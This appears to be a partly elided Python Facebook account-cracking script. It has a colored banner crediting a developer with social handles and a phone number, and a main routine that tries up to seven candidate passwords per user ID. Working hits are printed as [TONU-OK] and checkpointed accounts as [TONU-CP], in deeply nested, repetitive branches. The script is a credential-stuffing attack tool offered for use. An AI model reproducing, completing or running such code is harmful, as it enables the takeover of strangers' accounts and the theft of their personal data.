...
\033[1;91m_________ ___________________________
 |  _ \|  __ \    |__   __|  ____|  __ \|  \/  | |  | \ \ / /
 | |_) | |  | |______| |  | |__  | |__) | \  / | |  | |\ V / 
 |  _ <| |  | |______| |  |  __| |  _  /| |\/| | |  | | > <  
 | |_) | |__| |      | |  | |____| | \ \| |  | | |__| |/ . \ 
...
\033[1;97m••••••••••••••••••••••••••••••••••••••••••••••••••••••••
     ...
     \033[1;92m➣ \033[1;92mDEVOLPER   :           MEHEDI HASAN TOMI

     \033[1;91m➣ \033[1;92mFACEBOOK   :            MEHEDI HASAN TONU
     
     \033[1;93m➣ \033[1;92mWHATSAPP   :            +8801759916221

     \033[1;96m➣ \033[1;92mGITHUB     :            TONU-143
	...
	def main(arg):
		...
		try:
			...
			if "access_token" in q:
				...
				print(" \033[1;31m [TONU-OK] "+uid+" | "+pass1+"\033[0;97m")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;32m [TONU-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						print(" \033[1;33m [TONU-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;34m [TONU-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;35m [TONU-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									print(" \033[1;36m [TONU-CP] "+uid+" | "+pass3+"\033[0;97m")
									...
									if "access_token" in q:
										...
										print(" \033[1;31m [TONU-OK] "+uid+" | "+pass4+"\033[0;97m")
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;32m [TONU-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;33m [TONU-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;34m [TONU-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;35m [TONU-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;36m [TONU-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																print(" \033[1;31m [TONU-OK] "+uid+" | "+pass7+"\033[0;97m")
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;32m [TONU-CP] "+uid+" | "+pass7+"\033[0;97m")
		...
		try:
			...
			if "access_token" in q:
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					print(" \033[1;31m [TONU-CP] "+uid+" | "+pass1+"\033[0;97m")
					...
					if "access_token" in q:
						...
						print(" \033[1;36m [TONU-OK] "+uid+" | "+pass2+"\033[0;97m")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							print(" \033[1;35m [TONU-CP] "+uid+" | "+pass2+"\033[0;97m")
							...
							if "access_token" in q:
								...
								print(" \033[1;34m [TONU-OK] "+uid+" | "+pass3+"\033[0;97m")
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									if "access_token" in q:
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											print(" \033[1;31m [TONU-CP] "+uid+" | "+pass4+"\033[0;97m")
											...
											if "access_token" in q:
												...
												print(" \033[1;36m [TONU-OK] "+uid+" | "+pass5+"\033[0;97m")
												...
												if "www.facebook.com" in q["error_msg"]:
													...
													print(" \033[1;35m [TONU-CP] "+uid+" | "+pass5+"\033[0;97m")
													...
													if "access_token" in q:
														...
														print(" \033[1;34m [TONU-OK] "+uid+" | "+pass6+"\033[0;97m")
														...
														if "www.facebook.com" in q["error_msg"]:
															...
															print(" \033[1;23m [TONU-CP] "+uid+" | "+pass6+"\033[0;97m")
															...
															if "access_token" in q:
																...
																if "www.facebook.com" in q["error_msg"]:
																	...
																	print(" \033[1;31m [TONU-CP] "+uid+" | "+pass7+"\033[0;97m")
